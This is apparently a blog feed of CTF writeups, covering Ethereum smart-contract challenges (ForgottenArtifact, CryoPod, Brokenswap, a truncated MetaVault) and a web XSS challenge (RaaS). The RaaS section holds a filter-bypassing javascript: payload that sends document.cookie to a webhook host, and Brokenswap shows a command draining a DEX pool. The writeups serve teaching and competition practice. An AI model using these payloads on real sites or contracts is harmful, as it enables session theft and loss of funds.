conditions by calling the isSolved() function in the Setup contract, and print the flag.\n‚ûú nc $IP $PORT 1 - Get connection informations 2 - Restart Instance 3 - Get flag Select action (enter number): 3 HTB{y0u_c4n7_533_m3} Bonus # We could also have done that using web3py:\n[...] ForgottenArtifact = w3.eth.contract(address=target_addr, abi=target_abi) Setup = w3.eth.contract(address=setup_addr, abi=setup_abi) print(f\u0026#34;[*] Retrieving artifact origin transaction\u0026#34;) logs = Setup.events.DeployedTarget.get_logs(from_block=0) deployed_log = logs[0] origin_tx = deployed_log[\u0026#34;transactionHash\u0026#34;].hex() print(f\u0026#34;[*] Origin transaction: {origin_tx} @ block {deployed_log[\u0026#39;blockNumber\u0026#39;]}\u0026#34;) print(f\u0026#34;[*] Retrieving block informations\u0026#34;) origin_block = w3.eth.get_block(deployed_log[\u0026#34;blockNumber\u0026#34;]) print(f\u0026#34;[*] Block informations: {origin_block}\u0026#34;) block_number = origin_block[\u0026#34;number\u0026#34;] block_timestamp = origin_block[\u0026#34;timestamp\u0026#34;] print(f\u0026#34;[*] Block number: {deployed_log[\u0026#39;blockNumber\u0026#39;]}, timestamp: {block_timestamp}, msg.sender: {setup_addr}\u0026#34;) seed = w3.keccak(encode_packed([\u0026#34;uint\u0026#34;, \u0026#34;uint\u0026#34;, \u0026#34;address\u0026#34;], [deployed_log[\u0026#34;blockNumber\u0026#34;], block_timestamp, setup_addr])) print(f\u0026#34;[*] Artifact storage pointer location: 0x{seed.hex()}\u0026#34;) print(f\u0026#34;[*] Discovering artifact\u0026#34;) ForgottenArtifact.functions.discover(seed).transact() see the full exploitation script here.\nHTB{y0u_c4n7_533_m3}\n","date":"5 December 2024","externalUrl":null,"permalink":"/posts/htb-universityctf-2024/forgottenartifact/","section":"Blog","summary":"Author writeup for the \u0026ldquo;ForgottenArtifact\u0026rdquo; easy blockchain challenge from HTB University CTF 2024.","title":"HTB University CTF 2024 - ForgottenArtifact [Author Writeup]","type":"posts"},{"content":"","date":"5 December 2024","externalUrl":null,"permalink":"/tags/events/","section":"Tags","summary":"","title":"Events","type":"tags"},{"content":" CryoPod # 4th Dec 2024 Prepared By: perrythepwner Challenge Author(s): perrythepwner Difficulty: Very-Easy\nsimonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/HTB-UniversityCTF-2024/CryoPod TLDR # This challenge consists of reading the cryogenically stored secrets of simulated users in the smart contract by analyzing emitted events, examining contract storage, or decoding transactions.\nDescription # In the shadowed reaches of the Frontier Cluster, where lawlessness reigns and the oppressive Frontier Board tightens its grip, people lost hope for a prosperous future and decided to undergo cryogenic preservation, to be awakened in 50 years to a new world, or never to be awakened again.\nThe CryoPod smart contract serves as a digital vault, housing the secrets of those who sought to preserve some of their most precious memories.\nSkills Required # Basic understanding of Solidity and smart contracts Interaction with blockchain explorers (e.g., Etherscan, Blockscout, etc) Interaction with smart contracts Skills Learned # Extracting informations from the Ethereum blockchain Interacting with blockchain explorers Interacting with smart contracts Analyzing blockchain data and transaction logs Challenge Scenario # Life on the Frontier Cluster was once peaceful, but the ruthless Frontier Board has transformed it into a desolate and lawless region. As a former inhabitant subjected to cryogenic imprisonment, you hold the key to overthrowing the Board. The CryoPod smart contract houses the secrets of those who have been cryogenically stored. To execute your plan, you must access and read these hidden secrets in the ledger.\nAnalyzing the Source Code # The challenge provides the source code of the following contracts to players. To facilitate interaction with the blockchain, a Blockscout instance is also provided to the players.\nSetup.sol # As the name hints, it\u0026rsquo;s a contract that\u0026rsquo;s not directly the target to exploit but an instance used to deploy the actual challenge contracts and to verify solutions.\npragma solidity ^0.8.0; import { CryoPod } from \u0026#34;./CryoPod.sol\u0026#34;; contract Setup { CryoPod public immutable TARGET; bytes32 public flagHash = 0xfec0862a36a20acee57ee52f4503c7ea6bdfd96e351f7246c2c7794f1040c39e; event DeployedTarget(address at); constructor() payable { TARGET = new CryoPod(); emit DeployedTarget(address(TARGET)); } function isSolved(string calldata flag) public view returns (bool) { return keccak256(abi.encodePacked(flag)) == flagHash; } } From the initial analysis, to solve the challenge, a player must call the isSolved() function with a string argument that, when hashed, matches flagHash. Quantum hash cracking is not in scope for this challenge :p\nThe final retrieved flag will be directly valid for submission on the platform, but this Setup + TCP challenge handler is provided anyway to players to familiarize themselves with the standard blockchain challenge infrastructure.\nCryoPod.sol # The CryoPod smart contract allows users to store and update personal pods containing sensitive information. Here\u0026rsquo;s a look at the code:\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; /** * @title CryoPod * @dev A smart contract that allows each user to create and store a personal pod with a piece of information. * The information is stored permanently on the blockchain, and an event is emitted upon each storage action. */ contract CryoPod { mapping(address =\u0026gt; string) private pods; event PodStored(address indexed user, string data); /** * @dev Stores or updates the caller\u0026#39;s pod with the provided data. * @param _data The information to be stored in the user\u0026#39;s pod. */ function storePod(string memory _data) external { pods[msg.sender] = _data; emit PodStored(msg.sender, _data); } } In detail:\npods mapping: A mapping in Solidity is a key-value store that associates one type of data with another. In particular, the pods mapping associates a transaction-sender\u0026rsquo;s address with their stored secret. PodStored event: An event in Solidity is used to log specific actions that occur within the contract. The PodStored event is emitted every time a user stores or updates their pod, logging the user\u0026rsquo;s address and the data. storePod function: Functions in solidity can modify and/or read the state of the contract and the blockchain. This function in particular allows users to store permanently some data on the contract, to be able to retrieve them in a distant future. One of the pillar principles of the blockchain is that everything is public, thanks to the decentralized systems concepts it leverages to offer an Immutable, Transparent, Decentralized ledger.\nDevelopers commonly have, and always had, limitations on writing per-users models on smart contracts, capable of defining and isolating the data that a user can access.\nWhile this might sounds a big limitation of developing on the blockchain, it\u0026rsquo;s actually its inner nature and what distinguishes and makes this technology appreciable.\nThat means, when reviewing a smart contract, you should always ask yourself \u0026ldquo;Can other users read/write this?\u0026rdquo;, and the response is very likely yes.\nIn this contract, for example, we have the pods mapping that holds the user secrets, being declared as private. What does that means? In other programming languages, a construct that is labeled as private usually restricts the domain with which that data can be accessed. For example in Java, private members of class are not visible from outside the class itself.\nAnd this is what also happens in Solidity and smart contracts. Or rather\u0026hellip; this is what happens at the implementation layer: see Solidity documentation here. However, the data from a smart contract is published and made available throughout the blockchain. This means that there are more \u0026ldquo;low level\u0026rdquo; methods that allow access to this data categorized as \u0026ldquo;private\u0026rdquo;. For example, the storage layout of a contract is public and we can fetch the data contained in it by directly reading the memory of a smart contract using the RPC method eth_getStorageAt.\nIn fact, a possible solution for this challenge could be to understand how Solidity mappings are arranged in memory, dump the contract storage memory, and extract all the secrets stored in the users pods.\nThis can be a solution, but to make the challenge as accessible to all players as possible and to provide different facets of the concept of \u0026ldquo;everything is public on the blockchain\u0026rdquo;, we can solve in different ways. Since all data on the blockchain remains publicly accessible, a player can:\nExtract all transactions in which storePod function calls were made to the target address (smart contract address), and decode the arguments passed to the function call to read the passed secrets. This can be done from the provided Blockscout explorer instance, or by using tools like cast, web3py, or by using rpc methods directly. Filter all PodStored events emitted by the contract, and read the data property As PoC for the solver, the latter method is used.\nExploitation # To solve this challenge, we can use web3py create_filter method to fetch event logs on the blockhain.\n[...] CryoPod = w3.eth.contract(address=target_addr, abi=target_abi) # load contract instance event_filter = CryoPod.events.PodStored.create_filter(from_block=1) # subscribe to `PodStored` event events = event_filter.get_all_entries() # get all past emitted events [...] # poll for new emitted events while True: events = event_filter.get_new_entries() for event in events: print(f\u0026#34; [\u0026gt;] User: {event.args.user}\u0026#34;) print(f\u0026#34; [\u0026gt;] Data: {event.args.data}\u0026#34;) # access stored secret if \u0026#34;HTB{\u0026#34; in event.args.data: print(f\u0026#34;\\n\\n[!] Flag found: {event.args.data}\u0026#34;) exit(0) time.sleep(5) see the full exploitation script here.\nHTB{h3ll0_ch41n_sc0ut3r}\n","date":"5 December 2024","externalUrl":null,"permalink":"/posts/htb-universityctf-2024/cryopod/","section":"Blog","summary":"Author writeup for the \u0026ldquo;CryoPod\u0026rdquo; warmup blockchain challenge from HTB University CTF 2024.","title":"HTB University CTF 2024 - CryoPod [Author Writeup]","type":"posts"},{"content":" RaaS - MOCA CTF Quals 2024 # TL;DR # The challenge involved achieving User Interaction XSS inside a Flask template through the javascript: pseudo protocol. This was accomplished bypassing a filtering regex and blacklisted characters. 0. Description # A simple click-to-xss to warmup.\n1. Challenge scenario # We\u0026rsquo;re given a form in which it is possible to insert a link, a title, and be redirected to that URL. There is also the possibility of sending this link to the admin who will in turn be redirected.\nRaaS first look Source code is provided, so we\u0026rsquo;ll look into that to understand what\u0026rsquo;s happening.\n1.1) Source code analysis # The project is divided into two parts: the main application and the admin bot. We\u0026rsquo;ll look into the application code first.\napp.py\nfrom flask import Flask, request, render_template, Response, redirect,jsonify, make_response, g, redirect, send_file import requests import urllib.parse import re app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def main_page(): return render_template(\u0026#39;home.html\u0026#39;) def check_url(url): url = url.lower() pattern = r\u0026#39;[()=$`]\u0026#39; if bool(re.search(pattern, url, re.IGNORECASE | re.DOTALL)): return False if url.startswith(\u0026#34;j\u0026#34;) or \u0026#34;javascript\u0026#34; in url: return False return True def check_title(title): if \u0026#34;\u0026lt;\u0026#34; in title or \u0026#34;\u0026gt;\u0026#34; in title: return False return True @app.route(\u0026#39;/redirectTo\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def redirect_to(): url = request.args.get(\u0026#34;url\u0026#34;) title = request.args.get(\u0026#34;title\u0026#34;) default_url = \u0026#34;https://www.youtube.com/watch?v=xvFZjo5PgG0\u0026amp;ab_channel=Duran\u0026#34; if not isinstance(title,str) or not isinstance(url,str): return render_template(\u0026#39;redirect.html\u0026#39;,url=default_url, title=\u0026#34;title\u0026#34;) url = url.strip() if not check_url(url) or not check_title(title): return render_template(\u0026#34;redirect.html\u0026#34;, title=title, url=default_url) return render_template(\u0026#39;redirect.html\u0026#39;,url=url, title=title) @app.route(\u0026#39;/redirectAdmin\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def redirect_admin(): default_url = \u0026#34;https://www.youtube.com/watch?v=xvFZjo5PgG0\u0026amp;ab_channel=Duran\u0026#34; admin_bot = \u0026#34;http://raas-admin:3000/report_to_admin\u0026#34; url = request.args.get(\u0026#34;url\u0026#34;) title = request.args.get(\u0026#34;title\u0026#34;) if not isinstance(title,str) or not isinstance(url,str): requests.post(admin_bot, json={\u0026#34;url\u0026#34;:default_url, \u0026#34;title\u0026#34;:\u0026#34;title\u0026#34;}) return jsonify({\u0026#34;message\u0026#34;:\u0026#34;done\u0026#34;}), 201 url = url.strip() if not check_url(url) or not check_title(title): requests.post(admin_bot, json={\u0026#34;url\u0026#34;:default_url, \u0026#34;title\u0026#34;:\u0026#34;title\u0026#34;}) return jsonify({\u0026#34;message\u0026#34;:\u0026#34;done\u0026#34;}), 201 requests.post(admin_bot, json={\u0026#34;url\u0026#34;:url, \u0026#34;title\u0026#34;:title}) return jsonify({\u0026#34;message\u0026#34;:\u0026#34;done\u0026#34;}), 201 if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=5000) Clicking on the \u0026ldquo;Get Redirected!\u0026rdquo; button will trigger the /redirectTo route, which is anyway triggered also by the \u0026ldquo;Redirect the Admin!\u0026rdquo; button that executes the /redirectAdmin route. The first endpoint accepts the url and title parameters which must be strings and later passed to the check_url() and check_title() sanitizing functions. If we can bypass that with a working payload, we\u0026rsquo;ll have XSS. The second endpoint forwards the given URL to the admin bot, which simply goes to the /redirectTo endpoint with our inputs, and simulates a button click on the \u0026ldquo;Follow Link\u0026rdquo; button.\nThe check_url function aims to sanitize the URL input by converting it to lowercase, hence avoiding all the lowercase-uppercase payloads like jAvAsCriPt:aLeRt(1). It also check for the presence of some special characters with the regex r'[()=$`]' that will limit us later on exploitation. Particularly, it ensures the URL does not start with \u0026ldquo;j\u0026rdquo; character or contain the substring \u0026ldquo;javascript\u0026rdquo;. This comes out as the main limitation for us, since it should block the payloads with the javascript pseudo protocol.\nAt this point, a simple way out will be any other working pseudo protocol XSS payload like data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4. However, if we try so, the browser will insult us with:\nMy approach at this point was to split the checks individually in the source code an try to bypass them one by one.\n2. Exploitation # Below I will explain how I bypassed each of them, doing it with a bottom-up approach cause I found it more convenient.\n2.1) \u0026ldquo;javascript\u0026rdquo; not allowed bypass # We\u0026rsquo;re not allowed to use the string \u0026ldquo;javascript\u0026rdquo; anywhere in our URL, so\u0026hellip;just don\u0026rsquo;t use it! We will write\njava script instead. Here we are using a newline character to bypass the check. Since in the Python side \u0026quot;java\\x0Ascript\u0026quot; != \u0026quot;javascript\u0026quot;, but in the broswer java%0Ascript will still be considered a valid url for the javascript protocol.\nNote\nOur input get stripped before getting into che sanitizing function, however Python strip() function only removes leading and trailing characters. Even though this is a common bypass, I never actually knew why this was working. Researching for bypasses for the javascript pseudo protocol I\u0026rsquo;ve found this blog which was helpful to me to find out the reason why whitespaces are allowed in this situation and find out the bypass for the next filter. The reason seems to rely in the URL spec standard which removes any ASCII tab or newline from inputs.\n2.2) doesn\u0026rsquo;t starts with \u0026ldquo;j\u0026rdquo; bypass # This one was tougher. the strip function that was allowing me to bypass the previous check was sending me crazy on this one. Majority of payloads broke the javascript protocol: even if they bypassed the checks, they would just get included as part of the web application URL (e.g url=/java%0Ascript:payload). Another example is what I initially thought to be a NULL byte bypass, which caused instead a strange behaviour:\nAs you can see, it bypassed the python checks but in the button preview (left corner) it was mutated in some non printable character, invalidating it as protocol. However, i felt in being in the right path, until the previous blog confirmed my sensations.\nControl Characters are allowed?? It did, in fact.\nUsing the BACKSPACE (%08) character allowed me to bypass the python filter and still getting a valid url for the javascript protocol! And any of the ASCII Control Characters below would have probably get the job done.\n2.3) regex bypass # This was probably the easiest check to bypass, since javascript is very permissive in expressions that can be created even with a few symbols, it is no coincidence that there are many esoteric languages ‚Äã‚Äãon javascript such as JSFuck that manage to create valid expressions using only a few symbols.\nFun Fact\nhere I\u0026rsquo;ve found some of the funniest javascript esoteric shit expression while doing this challenge. Like\u0026hellip;how the fuck i can popup alert with fucking Egyptian hieroglyphs, but a simple NULL byte will break the shit out of the payload?? However, searching brainlessly \u0026ldquo;XSS payloads without parentheses\u0026rdquo; was enough since i found many working payloads inside this repo. I was also able to double encode inside the payload after the javascript: since javascript was decoding it.\n2.4) PoC # %08java%0Ascript%3Afetch%2528\u0026#39;https://webhook.site/xxxx\u0026#39;%2Bdocument.cookie%2529 // javascript:fetch(\u0026#39;https://webhook.site/xxxx\u0026#39;+document.cookie) Flag: PWNX{WH0_D035'N7_l0V3_4_g00D_0l'_W4F?}\n","date":"20 July 2024","externalUrl":null,"permalink":"/posts/moca-ctf-quals-2024/raas/","section":"Blog","summary":"Writeup for RaaS client-side web challenge of MOCA CTF Quals 2024","title":"MOCA CTF 2024 Quals - RaaS","type":"posts"},{"content":"","date":"20 July 2024","externalUrl":null,"permalink":"/tags/url-spec/","section":"Tags","summary":"","title":"URL Spec","type":"tags"},{"content":"","date":"20 July 2024","externalUrl":null,"permalink":"/tags/xss/","section":"Tags","summary":"","title":"XSS","type":"tags"},{"content":"","date":"10 May 2024","externalUrl":null,"permalink":"/tags/access-control/","section":"Tags","summary":"","title":"Access-Control","type":"tags"},{"content":" Brokenswap # \u0026ldquo;people said i was broke so i funded Brokenswap\u0026rdquo;\nDate: 10th May 2024 Challenge Author: perrythepwner Difficulty: Medium Category: Blockchain\nsimonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/HTB-BusinessCTF-2024/Brokenswap TL;DR # The challenge consist in finding a way to steal funds from a Decentralized Exchange (DEX). The DEX relies con the Constant Product Formula to calculate prices of the assets and it\u0026rsquo;s possible to cause an imbalance in the pool (and therefore make profitable trades) calling the _moveAmountToFeesPool() - incorrectly marked with the modifier public instead of internal - to move arbitrary tokens out of the liquidity pool. Description # Legend has it that a long time ago, a mysterious tech-wizard from Vault 13 crafted this DEX to ensure that only those flush with WETH tokens could wield power in the wasteland\u0026rsquo;s √©lite circles.\nEntry costs 15 WETH, and we\u0026rsquo;re fresh out. All we have left are a few ETH salvaged from previous challenges, but no wastelander has ever managed to scavenge any WETH.\nIt\u0026rsquo;s been ages, and WETH is nowhere to be found except in the depths of this DEX, which seems unbreakable\u0026hellip;\nSkills Required # Smart contract interaction. Skills Learned # DEXes fundamentals: Liquidity Pools, Trading Pairs, x*y = k formula. DEXes security: Liquidity Pools imbalance, Access Control vulnerabilities. Challenge background # In the wild world of DeFi, with an ever-increasing number of users, protocols, circulating liquidity, security has become more important than ever.\nSometimes, indeed often, people and developers tend to make trivial mistakes.\nIt happens. After all, we all are human.\nBut for this reason it becomes essential to have the code audited several times and by different sources before deploying it.\nAnd if someone don\u0026rsquo;t have sufficient funds, they can always resort to using well-known and well-audited external libraries.\nThis real-world challenge takes inspiration from the recent LeetSwap hack that occurred on August 1, 2023 causing a loss of 340 ETH (approximately $624,000 at the time) due to an Access Control vulnerability in the _transferFeesSupportingTaxTokens() function which was intended to be an internal function (note the trailing underscore) but was public modifier incorrectly assigned. Read more here.\nAn oversight worth more than half a million dollars.\nPlayers in this challenge will go through all the basic concepts of the functioning of Smart contracts, ERC 20, DEXes, Constant Product Formula etc, thanks to the documentation provided in the frontend of the challenge.\nThen, once assimilated the concepts (considering that the target audience is beginner-level) and understood what an interesting attack vector could be - e.g. causing an imbalance in the liquidity pool - they\u0026rsquo;ll solve the challenge by exploiting the public (rather than internal) function _moveAmountToFeesPool().\nChallenge scenario # There are swap, docs and connection routes in the frontend. Players also have the Challenge Handler and the source code of the Smart Contracts available.\nAnalyzing the Source Code # Docs # On this page players will have all the necessary information and concepts to solve the challenge, in case they don\u0026rsquo;t know them. This is done to provide a clear path to the player, without risking ending up in long searches or unnecessary rabbit holes. Furthermore key aspects are highlighted, to give some hints:\nSwap # This is the page where you can swap and see the token balances.\nNOTE: This UI is working and was made to make the challenge less abstract and/or insidious. However, with only frontend interaction it is not possible to solve the challenge. Players are thus forced to understand how to interact with the smart contract to use all the functions available and exploit the DEX.\nConnection # Connection info also accessible via the Challenge Handler.\nChallenge Handler # Since this challenge was built on top of the Paradigm 2022 CTF infrastructure, it\u0026rsquo;s available to player the Challenge Handler to Start a new instance of the challenge, Kill it, or Get the flag if condition are satisfied.\nSetup.sol # This is the setup contract used to deploy challenge contracts and check if solution condition are satisfied. Players starts with 10 WETH and to solve the challenge they have to manage to steal some from the Brokenswap contract.\nBrokenswap.sol # This is the code where all the DEX logics happens.\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.20; import \u0026#34;@openzeppelin/contracts/token/ERC20/IERC20.sol\u0026#34;; import \u0026#34;@openzeppelin/contracts/token/ERC20/ERC20.sol\u0026#34;; import \u0026#34;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\u0026#34;; /// @title Brokenswap, \u0026#34;people said i was broke so i funded Brokenswap\u0026#34;. /// @notice AMM decentralized exchange (DEX) for swapping supported tokens with a fee mechanism. contract Brokenswap { using SafeERC20 for IERC20; uint256 public INVARIANT; // The product (k) of the two token balances (x and y), given by: x*y=k. uint256 public immutable FEERATE; // The fee rate, expressed as a percentage (e.g., 5 for 0.5%). address public immutable feesPool; // The address where fees are collected. mapping(address =\u0026gt; bool) public supportedTokens; // Mapping of supported tokens. event Swap( uint256 indexed inputAmount, uint256 indexed outputAmount, uint256 indexed fees ); /// @notice Constructor to initialize the Brokenswap contract. /// @param tokenA The address of the first supported token. /// @param tokenB The address of the second supported token. /// @param feeRate The fee rate, expressed as a percentage (e.g., 5 for 0.5%). /// @param feesPoolAddress The address where fees are collected. constructor (address tokenA, address tokenB, uint256 feeRate, address feesPoolAddress) payable { FEERATE = (feeRate \u0026gt; 5) ? feeRate : 5; // Ensure the fee rate is at least 0.5%. feesPool = feesPoolAddress; supportedTokens[tokenA] = true; supportedTokens[tokenB] = true; } /// @notice Swaps one supported token for another. /// @param inputToken The address of the token we\u0026#39;re swapping from. /// @param outputToken The address of the output token we\u0026#39;re swapping to. /// @param inputAmount The amount of input token to swap, in 18 decimals. e.g inputAmount=1e18 to swap 1 token. /// @return A boolean indicating the success of the swap. function swap(address inputToken, address outputToken, uint256 inputAmount) public returns (bool) { // Check if the tokens are supported. require(supportedTokens[inputToken] == true \u0026amp;\u0026amp; supportedTokens[outputToken] == true, \u0026#34;Token not supported\u0026#34;); IERC20 inToken = IERC20(inputToken); IERC20 outToken = IERC20(outputToken); // Calculate the invariant before any transaction. INVARIANT = inToken.balanceOf(address(this)) * outToken.balanceOf(address(this)); // Check if the user has allowed the contract to transfer the input amount. require(inToken.allowance(msg.sender, address(this)) \u0026gt;= inputAmount, \u0026#34;You must approve transfer first\u0026#34;); // Depositing the input token amount from user into the contract. inToken.safeTransferFrom(msg.sender, address(this), inputAmount); // Deduct fees on the input token. uint256 fees = (inputAmount * FEERATE) / 1000; // Move swap fee to the fees pool. _moveAmountToFeesPool(address(inToken), fees); // Calculate the output token amount to send to the user. uint256 _outputAmount = calcOutputAmount(address(inToken), address(outToken)); // Transfer the output amount from contract to the user. outToken.safeTransfer(msg.sender, _outputAmount); // Emit the Swap event to log the transaction. emit Swap(inputAmount, _outputAmount, fees); return true; } /// @notice Internal function to move a specified amount of token to the fees pool. /// @param payingToken The address of the token used to pay fees. /// @param amount The amount to move to the fees pool. /// @return A boolean indicating the success of the transfer. function _moveAmountToFeesPool(address payingToken, uint256 amount) public returns (bool) { require(supportedTokens[payingToken] == true, \u0026#34;Token not supported\u0026#34;); IERC20(payingToken).safeTransfer(feesPool, amount); return true; } /// @notice Calculate the output amount for a given input and output token pair. /// @param inputToken The address of the input token. /// @param outputToken The address of the output token. /// @return The calculated output amount. function calcOutputAmount(address inputToken, address outputToken) public view returns (uint256) { require(supportedTokens[inputToken] == true \u0026amp;\u0026amp; supportedTokens[outputToken] == true, \u0026#34;Token not supported\u0026#34;); uint256 balanceInToken = IERC20(inputToken).balanceOf(address(this)); uint256 balanceOutToken = IERC20(outputToken).balanceOf(address(this)); // Calculate the new output amount based on the invariant. uint256 newBalanceOutToken = INVARIANT / balanceInToken; return (balanceOutToken - newBalanceOutToken); } /// @notice Get the balance of a supported token held by the contract. /// @param token The address of the supported token. /// @return The balance of the token held by the contract. function balanceOfToken(address token) public view returns (uint256) { require(supportedTokens[token] == true, \u0026#34;Token not supported\u0026#34;); return IERC20(token).balanceOf(address(this)); } } The code is richly commented on every line and functionality, with the integration of the documentation it\u0026rsquo;s almost immediate to understand how it works.\nFeesPool.sol # // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.20; import \u0026#34;@openzeppelin/contracts/token/ERC20/IERC20.sol\u0026#34;; import \u0026#34;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\u0026#34;; import \u0026#34;@openzeppelin/contracts/access/Ownable.sol\u0026#34;; /// @title FeesPool, collect and withdraw fees of swaps. /// @notice This contract allows the owner to manage and withdraw fees collected in supported tokens. contract FeesPool is Ownable { using SafeERC20 for IERC20; IERC20 public immutable tokenA; // The first supported token. IERC20 public immutable tokenB; // The second supported token. event FeesCollected(IERC20 token, uint256 amount, address indexed collector); event FeesWithdrawn(IERC20 token, uint256 amount, address indexed recipient); /// @notice Constructor to initialize the FeesPool contract. /// @param _tokenA The address of the first supported token. /// @param _tokenB The address of the second supported token. constructor(address _tokenA, address _tokenB) Ownable(msg.sender) { tokenA = IERC20(_tokenA); tokenB = IERC20(_tokenB); } /// @notice Withdraw collected fees in tokenA. /// @param amount The amount of tokenA to withdraw. function withdrawFeesTokenA(uint256 amount) public onlyOwner { require(amount \u0026gt; 0, \u0026#34;Invalid withdrawal amount\u0026#34;); tokenA.safeTransfer(msg.sender, amount); emit FeesWithdrawn(tokenA, amount, msg.sender); } /// @notice Withdraw collected fees in tokenB. /// @param amount The amount of tokenB to withdraw. function withdrawFeesTokenB(uint256 amount) public onlyOwner { require(amount \u0026gt; 0, \u0026#34;Invalid withdrawal amount\u0026#34;); tokenB.safeTransfer(msg.sender, amount); emit FeesWithdrawn(tokenB, amount, msg.sender); } /// @notice Get the balance of tokenA held by the contract. /// @return The balance of tokenA held by the contract. function balanceTokenA() public view returns (uint256) { return tokenA.balanceOf(address(this)); } /// @notice Get the balance of tokenB held by the contract. /// @return The balance of tokenB held by the contract. function balanceTokenB() public view returns (uint256) { return tokenB.balanceOf(address(this)); } } The FeesPool contract is the responsibile pool which stores the fees collected from each swap on Brokenswap, where only the owner (the deployer of the contract i.e. the Setup.sol address) can withdraw the funds. Players will be able to use the balanceTokenA() and balanceTokenB() functions to view the status of the pool during the resolution of the challenge.\nOther Contracts # The HTBtoken.sol, WETH9.sol contracts, and libraries are not part of the challenge scope but were needed. The Openzeppelin libraries were used, probably the most secure and most used in the field. This gives players the opportunity to learn what Openzeppelin is and exclude any vulnerabilities within these smart contracts for the purposes of the challenge.\nSolution # Once we read the documentation we therefore understood that:\nTo allow the correct functioning of the DEX, according to the Constant Product Formula, the INVARIANT, i.e. the product of the quantity of tokens must remain, in fact, invariant. The price of token B is simply given by y = k/x where: x represents the amount of TokenA in the Liquidity Pool. y represents the amount of TokenB in the Liquidity Pool. k is the constant value determined when liquidity is initially added. And vice versa. The curve representing this function allows us to visualize how the quantity of tokens in the pool will never end, providing infinite liquidity to the protocol. This is due to the fact that the curve never intersects with the axes that represent the balance of tokens in the pool. For a quantity of Token A that approaches 0, the quantity of Token B MUST approach infinity. This \u0026ldquo;MUST\u0026rdquo; imperative consequently dictates the price at each swap. According to the law of demand and supply, the more an asset becomes scarce, the more its value increases.\nSo how can we exploit this logic to steal funds from the protocol? # Answer: By breaking rule number 1 which allows it to function entirely, i.e. when the INVARIANT varies (and as the name suggests, this should not happen).\nHow can we do it? In the source code of Brokenswap.sol you can see how there is a function, with a naming convention different from the others. That is, the function _moveAmountToFeesPool():\nIn fact, as the function\u0026rsquo;s NatSpec describes, _moveAmountToFeesPool() is meant to be an Internal function. However, notice how it actually has the public modifier!\nWith this informations - having no other options - we can understand that:\nby moving an arbitrary number of tokens out of the Brokenswap Liquidity Pool and making a token that we already own more scarce it\u0026rsquo;ll grow in value. Note how the function accepts any quantity of any token, it is therefore not limited to the quantity of fees collected.\nExploitation # Starting balance: We need to gain WETH tokens. To make them gain value, firstly we need to swap some of them in HTB token. Exploiting the Liquidity Pool by calling the _moveAmountToFeesPool() with arbitrary amount of tokens to move to arbitrary location. For demonstration we\u0026rsquo;ll get out of the Liquidity Pool 498 of the remaining HTB tokens, meaning that it\u0026rsquo;ll become extremely scarce and our ~2 HTB token swapped previously extremely valuable.\ncast send $BROKENSWAP_ADDRESS \u0026#34;_moveAmountToFeesPool(address,uint256)\u0026#34; $HTB_TOKEN_ADDRESS 498000000000000000000 --rpc-url $RPC_URL --private-key $PVK Swap back the HTB tokens to drain the WETH tokens in the Liquidity Pool and become rich. We now have (way) more WETH balance than before: Get the flag (who cares of the WETHs) HTB{1_w4sn7_7h3_0nly_7h1ng_br0k3}\n","date":"10 May 2024","externalUrl":null,"permalink":"/posts/htb-businessctf-2024/brokenswap/","section":"Blog","summary":"Author writeup for the \u0026ldquo;Brokenswap\u0026rdquo; medium blockchain challenge from HTB Business CTF 2024.","title":"HTB Business CTF 2024 - Brokenswap [Author Writeup]","type":"posts"},{"content":"","date":"10 May 2024","externalUrl":null,"permalink":"/tags/xyk/","section":"Tags","summary":"","title":"X*y=k","type":"tags"},{"content":" MetaVault # 10th May 2024 Prepared By: perrythepwner Challenge Author(s): perrythepwner Difficulty: Easy\nsimonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/HTB-BusinessCTF-2024/MetaVault Synopsis # Although this challenge aims to be entry level, it focuses on a quite overlooked (but at the same time important) aspect: the self verification of smart contracts and how \u0026ldquo;secrets\u0026rdquo; can sometimes be hidden in the metadata. Description # The Ministry of Defense released the open source of \u0026ldquo;MetaVault\u0026rdquo;, the country\u0026rsquo;s Ethereum reserves. It\u0026rsquo;s said that they keeps secrets in a meta-location, so that no one can know them.\nSkills Required # JSON RPC interaction. Skills Learned # Smart Contract metadata. IPFS. Verifying Smart Contracts. Retrieve sensitive information from compilation metadata. Analyzing the source code # Let\u0026rsquo;s examine the provided source code.\nSetup.sol\npragma solidity 0.8.25; import {MetaVault} from \u0026#34;./MetaVault.sol\u0026#34;; contract Setup { MetaVault public immutable TARGET; constructor() payable { TARGET = new MetaVault(); TARGET.deposit{value: 100 ether}(); } function isSolved() public view returns (bool) { return address(TARGET).balance == 0; } } This setup will deploy the challenge instance for us. It appears that a TARGET contract will be deployed with 100 ethers in it. To solve the challenge, we must drain the contract.\nRecruitment.sol\n// SPDX-License-Identifier: MoD-Internal-v1.0 pragma solidity 0.8.25; /** * @title MetaVault * @author Ministry of Defense * @notice MoD (Ministry of Defense) Smart Contract storing the country\u0026#39;s ETH reserves. */ contract MetaVault { /** * @notice Keccak256 hashed secret passphrase to enable emergency mode. * @dev plaintext secret: [REDACTED] * @dev The secret will be stripped before open sourcing the code. Comments are not compiled anyway. */ bytes32 constant private VAULT_SECRET_K256 = 0x42c10591ced4987005f70d29b498348ecc8ab18dd28c5b93db931375ca826b5e; event Deposit( address indexed _from, uint256 indexed _value, uint256 indexed _updatedBalance ); event FailedLoginAttempt( address indexed _from, string indexed _attempt, bytes32 indexed _hashedAttempt ); event EmergencyMode( address indexed _by, address indexed _fundsDestination ); /** * @dev Retrieves the current ETH balance of the vault. * @return balance of the vault in wei. */ function getVaultBalance() public view returns (uint256) { return address(this).balance; } /** * @notice Deposit function to receive ETH deposits. * @dev emits a Deposit event with the depositor, the value deposited and the updated balance after deposit. */ function deposit() public payable { emit 